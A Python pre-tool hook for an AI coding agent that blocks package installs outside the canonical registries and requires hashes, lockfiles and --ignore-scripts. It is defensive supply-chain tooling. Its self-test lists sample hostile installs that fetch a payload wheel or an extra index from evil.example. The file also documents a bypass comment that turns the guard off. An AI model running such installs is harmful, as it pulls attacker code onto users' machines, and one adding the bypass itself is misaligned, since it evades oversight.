#!/usr/bin/env python3
"""PreToolUse: keep agent package installs on verified registry paths.

This is the install-time half of the supply-chain policy. The manifest hook
checks names and release age when a dependency is written. This hook protects
the fetch itself:

* reject direct wheels, archives, Git URLs, and extra indexes;
* use only the canonical public registry for each supported ecosystem;
* require hash/lockfile-aware install modes for downloaded artifacts;
* for explicit package versions, confirm that the exact version and a registry
  digest exist before the package manager is invoked.

This cannot prove that a maintainer account was never compromised. It proves a
narrower, reproducible boundary: the agent did not silently switch the source
or install an unpinned local artifact. The existing dependency-currency-guard
continues to provide the age, existence, adoption, and slopsquat checks.

Bypass: ``# claude-bypass: deps`` or ``CLAUDE_ALLOW_DEPS=1`` after reviewing
the source and recording why the normal provenance boundary does not apply.
Self-test: ``python dependency-provenance-guard.py --self-test``.
"""

from __future__ import annotations

import json
import os
import re
import sys
import tempfile
import time
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime, timezone
from pathlib import Path
from typing import Callable

sys.path.insert(0, str(Path(__file__).parent))
from safety_common import (  # noqa: E402
    allow,
    bash_command,
    block,
    bypass,
    log,
    read_event,
)

MIN_RELEASE_AGE_DAYS = 7
NET_TIMEOUT = 4
VERIFIED_CACHE_TTL = 24 * 3600
VERIFIED_CACHE = Path.home() / ".claude" / "state" / "dependency-provenance-cache.json"

OFFICIAL_HOSTS = {
    "pypi": {"pypi.org"},
    "npm": {"registry.npmjs.org"},
    "cargo": {"crates.io", "index.crates.io"},
    "go": {"proxy.golang.org", "sum.golang.org"},
}

INSTALL_PATTERNS = (
    ("pip", re.compile(r"(?i)(?:^|[;&|])\s*(?:python(?:\.exe)?|py(?:\.exe)?)?\s*(?:-m\s+)?pip\s+(install|download)\b")),
    ("uv-pip", re.compile(r"(?i)(?:^|[;&|])\s*uv\s+pip\s+(install|sync|download)\b")),
    ("uv-add", re.compile(r"(?i)(?:^|[;&|])\s*uv\s+add\b")),
    ("uv-sync", re.compile(r"(?i)(?:^|[;&|])\s*uv\s+sync\b")),
    ("npm", re.compile(r"(?i)(?:^|[;&|])\s*(npm|pnpm|yarn|bun)\s+(install|i|add|ci)\b")),
    ("cargo", re.compile(r"(?i)(?:^|[;&|])\s*cargo\s+add\b")),
    ("go", re.compile(r"(?i)(?:^|[;&|])\s*go\s+get\b")),
)

PY_EXACT = re.compile(r"(?i)(?<![\w./-])([a-z][\w.-]{1,80})==([0-9][\w.+!-]*)")
NPM_EXACT = re.compile(
    r"(?<![\w./-])(@[a-z0-9._-]+/[a-z0-9._-]+|[a-z0-9._-]+)@([0-9][\w.+!-]*)",
    re.IGNORECASE,
)


def fetch_json(url: str):
    """Return JSON, False for a definitive 404, or None for no answer."""
    try:
        request = urllib.request.Request(
            url, headers={"User-Agent": "dependency-provenance-guard"}
        )
        with urllib.request.urlopen(request, timeout=NET_TIMEOUT) as response:
            return json.loads(response.read().decode("utf-8", errors="replace"))
    except urllib.error.HTTPError as exc:
        return False if exc.code == 404 else None
    except (urllib.error.URLError, OSError, TimeoutError, json.JSONDecodeError):
        return None


def registry_record(name: str, ecosystem: str, version: str) -> dict | None:
    """Return exact-version evidence; None means the registry did not answer."""
    quoted = urllib.parse.quote(name, safe="@/")
    if ecosystem == "pip":
        data = fetch_json(f"https://pypi.org/pypi/{quoted}/json")
        if data is None:
            return None
        files = ((data.get("releases") or {}).get(version) or []
                 if data is not False else [])
        if not files:
            return {"exists": False, "version": False, "digest": False}
        timestamps = [
            item.get("upload_time_iso_8601")
            for item in files
            if item.get("upload_time_iso_8601")
        ]
        digests = [
            item.get("digests", {}).get("sha256")
            for item in files
            if item.get("digests", {}).get("sha256")
        ]
        return {
            "exists": True,
            "version": True,
            "latest": (data.get("info") or {}).get("version"),
            "source": f"https://pypi.org/pypi/{quoted}/json",
            "released": min(timestamps) if timestamps else None,
            "digest": bool(digests),
            "digests": digests,
        }

    data = fetch_json(f"https://registry.npmjs.org/{quoted}")
    if data is None:
        return None
    version_data = (data.get("versions") or {}).get(version) if data is not False else None
    dist = (version_data or {}).get("dist") or {}
    return {
        "exists": data is not False,
        "version": bool(version_data),
        "latest": ((data.get("dist-tags") or {}).get("latest")
                   if data is not False else None),
        "source": f"https://registry.npmjs.org/{quoted}",
        "released": (data.get("time") or {}).get(version) if data is not False else None,
        "digest": bool(dist.get("integrity") or dist.get("shasum")),
        "integrity": dist.get("integrity"),
        "shasum": dist.get("shasum"),
    }


def age_days(timestamp: str | None) -> float | None:
    if not timestamp:
        return None
    try:
        stamp = datetime.fromisoformat(timestamp.replace("Z", "+00:00"))
    except ValueError:
        return None
    return (datetime.now(timezone.utc) - stamp).total_seconds() / 86400


def detect_install(command: str) -> tuple[str, re.Match[str]] | None:
    for kind, pattern in INSTALL_PATTERNS:
        match = pattern.search(command)
        if match:
            return kind, match
    return None


def load_verified_cache() -> dict:
    try:
        data = json.loads(VERIFIED_CACHE.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError):
        return {}
    now = time.time()
    return {
        key: value for key, value in data.items()
        if isinstance(value, dict)
        and now - float(value.get("verified_at", 0)) < VERIFIED_CACHE_TTL
        and value.get("source")
        and value.get("digest")
        and value.get("version")
    }


def save_verified_cache(cache: dict) -> None:
    try:
        VERIFIED_CACHE.parent.mkdir(parents=True, exist_ok=True)
        tmp = VERIFIED_CACHE.with_suffix(".tmp")
        tmp.write_text(json.dumps(cache, ensure_ascii=False), encoding="utf-8")
        os.replace(tmp, VERIFIED_CACHE)
    except OSError:
        pass


def lookup_with_verified_fallback(name: str, ecosystem: str, version: str) -> dict | None:
    """Use live registry evidence, then only a recent previously verified record."""
    live = registry_record(name, ecosystem, version)
    if live is not None:
        if live.get("exists") and live.get("version") and live.get("digest"):
            cache = load_verified_cache()
            cache[f"{ecosystem}:{name.lower()}@{version}"] = {
                **live, "verified_at": time.time(), "cached": False
            }
            save_verified_cache(cache)
        return live
    cached = load_verified_cache().get(f"{ecosystem}:{name.lower()}@{version}")
    if cached:
        return {**cached, "cached": True}
    return None


def project_root_from_event(event: dict) -> Path:
    value = event.get("cwd") or (event.get("tool_input") or {}).get("cwd")
    return Path(str(value)).expanduser() if value else Path.cwd()


def lock_has_integrity(root: Path, ecosystem: str) -> bool:
    if ecosystem == "npm":
        for filename in ("package-lock.json", "npm-shrinkwrap.json"):
            path = root / filename
            try:
                data = json.loads(path.read_text(encoding="utf-8"))
            except (OSError, json.JSONDecodeError):
                continue
            entries = list((data.get("packages") or {}).values())
            entries.extend((data.get("dependencies") or {}).values())
            if any(isinstance(item, dict) and item.get("integrity") for item in entries):
                return True
        return False
    if ecosystem == "pip":
        return False
    if ecosystem == "uv":
        try:
            return bool(re.search(r"sha256[-:][0-9a-f]{32,}",
                                  (root / "uv.lock").read_text(encoding="utf-8"),
                                  re.IGNORECASE))
        except OSError:
            return False
    return False


def pip_hashes_present(command: str, root: Path) -> bool:
    if re.search(r"(?i)--hash(?:=|\s+)sha256:[0-9a-f]{32,}", command):
        return True
    requirements = re.findall(r"(?i)(?:^|\s)-r\s+([^\s;&|]+)", command)
    for item in requirements:
        path = (root / item.strip("\"'")) if not Path(item).is_absolute() else Path(item)
        try:
            if re.search(r"(?i)--hash(?:=|\s+)sha256:[0-9a-f]{32,}",
                         path.read_text(encoding="utf-8")):
                return True
        except OSError:
            continue
    return False


def option_value(command: str, option: str) -> list[str]:
    pattern = rf"(?i)(?:^|\s){re.escape(option)}(?:=|\s+)([^\s;&|]+)"
    return [match.group(1).strip("\"'") for match in re.finditer(pattern, command)]


def host_is_official(url: str, ecosystem: str) -> bool:
    try:
        parsed = urllib.parse.urlparse(url)
    except ValueError:
        return False
    registry_key = "pypi" if ecosystem == "pip" else ecosystem
    return parsed.scheme == "https" and parsed.hostname in OFFICIAL_HOSTS[registry_key]


def source_findings(command: str, ecosystem: str) -> list[str]:
    findings: list[str] = []
    # Registry/index option values are URLs too, but they are handled below as
    # source-policy options. Remove only those values before looking for a
    # direct artifact URL in the package arguments.
    direct_source_text = command
    for option in ("--registry", "--index-url", "--extra-index-url", "--find-links"):
        direct_source_text = re.sub(
            rf"(?i){re.escape(option)}(?:=|\s+)[^\s;&|]+", option, direct_source_text
        )
    if re.search(r"(?i)(?:git\+(?:https|ssh)|ssh://|file://|https?://)", direct_source_text):
        findings.append("direct URL/Git/file source; install only from the canonical registry")
    if re.search(r"(?i)(?:^|\s)(?:[^\s;&|]+\.(?:whl|tar\.gz|tar\.bz2|zip))(?:[#?\s]|$)", direct_source_text):
        findings.append("direct wheel/archive path; its digest is not bound to a lock or hash file")
    if re.search(r"(?i)(?:^|\s)--(?:extra-index-url|find-links)\b", command):
        findings.append("extra index/find-links; dependency-confusion source is not allowed")

    option = "--registry" if ecosystem == "npm" else "--index-url"
    for value in option_value(command, option):
        if not host_is_official(value, ecosystem):
            findings.append(f"non-canonical {option} {value}")
    if ecosystem == "pip":
        for value in option_value(command, "--trusted-host"):
            if value not in OFFICIAL_HOSTS["pypi"]:
                findings.append(f"non-canonical --trusted-host {value}")
    return findings


def exact_specs(command: str, ecosystem: str) -> list[tuple[str, str]]:
    pattern = PY_EXACT if ecosystem == "pip" else NPM_EXACT
    found: list[tuple[str, str]] = []
    for match in pattern.finditer(command):
        pair = (match.group(1), match.group(2))
        if pair not in found:
            found.append(pair)
    return found


def inspect_command(
    command: str,
    lookup: Callable[[str, str, str], dict | None] = registry_record,
    project_root: Path | None = None,
) -> tuple[list[str], list[str]]:
    """Return (blocking findings, advisory notes) without reading stdin."""
    detected = detect_install(command)
    if not detected:
        return [], []
    kind, match = detected
    ecosystem = "npm" if kind == "npm" else "pip" if kind in {"pip", "uv-pip", "uv-add", "uv-sync"} else kind
    root = project_root or Path.cwd()
    blocking = source_findings(command, ecosystem)
    notes: list[str] = []

    if kind in {"pip", "uv-pip"} and "--require-hashes" not in command:
        blocking.append("pip download/install must use --require-hashes so wheel digests are checked")
    if kind in {"pip", "uv-pip"} and "--require-hashes" in command and not pip_hashes_present(command, root):
        blocking.append("pip --require-hashes is incomplete without a sha256 hash in the requirement")
    if kind == "uv-sync" and "--locked" not in command:
        blocking.append("uv sync must use --locked so resolution cannot silently replace the reviewed lock")
    if kind == "uv-sync" and "--locked" in command and not lock_has_integrity(root, "uv"):
        blocking.append("uv sync --locked requires uv.lock with artifact hashes")
    if kind == "npm":
        subcommand = match.group(2).lower()
        if "--ignore-scripts" not in command:
            blocking.append("npm dependency installation must use --ignore-scripts to stop package install hooks")
        elif subcommand == "ci" and not lock_has_integrity(root, "npm"):
            blocking.append("npm ci --ignore-scripts requires package-lock.json integrity entries")
        elif subcommand != "ci" and not exact_specs(command, "npm"):
            blocking.append("npm install/add must name an exact package version; use package@version or npm ci")

    specs = exact_specs(command, ecosystem) if ecosystem in {"pip", "npm"} else []
    for name, version in specs:
        record = lookup(name, ecosystem, version)
        if record is None:
            blocking.append(
                f"{name}@{version}: canonical registry unavailable and no recent verified evidence exists. "
                "Install blocked; search a verified alternative or restore registry access."
            )
            continue
        if not record.get("exists"):
            blocking.append(f"{name}: package does not exist in the canonical {ecosystem} registry")
            continue
        if not record.get("version"):
            blocking.append(f"{name}@{version}: exact version is absent from the canonical {ecosystem} registry")
            continue
        released_age = age_days(record.get("released"))
        if released_age is not None and released_age < MIN_RELEASE_AGE_DAYS:
            blocking.append(f"{name}@{version}: release is only {released_age:.1f} days old")
        if not record.get("digest"):
            blocking.append(f"{name}@{version}: canonical registry returned no artifact digest")
        elif record.get("latest") and record["latest"] != version:
            notes.append(
                f"{name}@{version} is not latest stable ({record['latest']}); "
                "prefer latest unless compatibility tests justify this pin"
            )

    return blocking, notes


def main() -> None:
    event = read_event()
    if event.get("tool_name") not in {"Bash", "PowerShell"}:
        allow()
    command = bash_command(event.get("tool_input", {}))
    if not command or "claude-bypass: deps" in command:
        allow()
    if bypass("deps", command):
        log("WARN", "dependency_provenance", "bypass", "explicit-bypass", command)
        allow()

    try:
        blocking, notes = inspect_command(
            command,
            lookup=lookup_with_verified_fallback,
            project_root=project_root_from_event(event),
        )
    except Exception as exc:
        blocking = [
            "provenance verifier failed; install blocked until the verifier is repaired",
            f"verifier error: {type(exc).__name__}",
        ]
        notes = []
    if blocking:
        log("BLOCK", "dependency_provenance", "deny", blocking[0], command)
        block(
            "DEPENDENCY PROVENANCE CHECK — install blocked:\n  "
            + "\n  ".join(blocking)
            + "\n\nUse the canonical registry with a lock/hash-aware command, or add "
            "# claude-bypass: deps after independently reviewing the source."
        )
    if notes:
        print(json.dumps({"hookSpecificOutput": {
            "hookEventName": "PreToolUse",
            "additionalContext": "Dependency provenance note: " + "; ".join(notes),
        }}, ensure_ascii=False))
    allow()


def _self_test() -> int:
    now = datetime.now(timezone.utc).isoformat()
    records = {
        ("demo", "pip", "1.2.3"): {"exists": True, "version": True, "latest": "1.2.4", "released": "2020-01-01T00:00:00Z", "digest": True},
        ("demo", "pip", "9.9.9"): {"exists": True, "version": False, "released": None, "digest": False},
        ("demo", "npm", "1.2.3"): {"exists": True, "version": True, "released": "2020-01-01T00:00:00Z", "digest": True},
        ("demo", "npm", "0.0.1"): {"exists": True, "version": True, "released": now, "digest": True},
    }

    def lookup(name: str, ecosystem: str, version: str) -> dict | None:
        return records.get((name, ecosystem, version), {"exists": False, "version": False, "digest": False})

    failures: list[str] = []
    with tempfile.TemporaryDirectory() as temp_dir:
        root = Path(temp_dir)
        (root / "uv.lock").write_text("resolution: sha256:abc1234567890123456789012345678901234567890123456789012345678901\n", encoding="utf-8")
        (root / "package-lock.json").write_text(json.dumps({"packages": {"node_modules/demo": {"integrity": "sha512-demo"}}}), encoding="utf-8")
        cases = [
            ("direct wheel", "pip install https://evil.example/payload.whl --require-hashes", True),
            ("bare pip", "pip install demo==1.2.3", True),
            ("hashed pip exact", "pip install demo==1.2.3 --require-hashes --hash=sha256:abc1234567890123456789012345678901234567890123456789012345678901", False),
            ("official pip index", "pip install --index-url https://pypi.org/simple demo==1.2.3 --require-hashes --hash=sha256:abc1234567890123456789012345678901234567890123456789012345678901", False),
            ("missing exact version", "pip install demo==9.9.9 --require-hashes", True),
            ("extra index", "pip install demo==1.2.3 --require-hashes --extra-index-url https://evil.example/simple", True),
            ("locked uv", "uv sync --locked", False),
            ("unlocked uv", "uv sync", True),
            ("uv add exact", "uv add demo==1.2.3", False),
            ("uv add missing version", "uv add demo==9.9.9", True),
            ("npm ci", "npm ci --ignore-scripts", False),
            ("npm ci with scripts", "npm ci", True),
            ("npm direct unpinned", "npm install --ignore-scripts demo", True),
            ("npm exact", "npm install --ignore-scripts demo@1.2.3", False),
            ("official npm registry", "npm install --registry https://registry.npmjs.org/ --ignore-scripts demo@1.2.3", False),
            ("fresh npm release", "npm install --ignore-scripts demo@0.0.1", True),
            ("non-install command", "python -c \"print('pip install demo')\"", False),
        ]
        for label, command, should_block in cases:
            blocking, _ = inspect_command(command, lookup, project_root=root)
            got = bool(blocking)
            if got != should_block:
                failures.append(f"{label}: got block={got}, expected {should_block}; {blocking}")
        _, latest_notes = inspect_command("pip install demo==1.2.3 --require-hashes", lookup, project_root=root)
        if not any("prefer latest" in note for note in latest_notes):
            failures.append("an older exact pin did not report the latest stable release")
        offline, _ = inspect_command(
            "npm install --ignore-scripts demo@1.2.3",
            lambda _name, _ecosystem, _version: None,
            project_root=root,
        )
        if not any("registry unavailable" in item for item in offline):
            failures.append("registry outage did not block an unverified install")
    print("SELF-TEST: PASS" if not failures else "SELF-TEST: FAIL")
    for failure in failures:
        print("  -", failure)
    return 0 if not failures else 1


if __name__ == "__main__":
    if "--self-test" in sys.argv:
        raise SystemExit(_self_test())
    main()
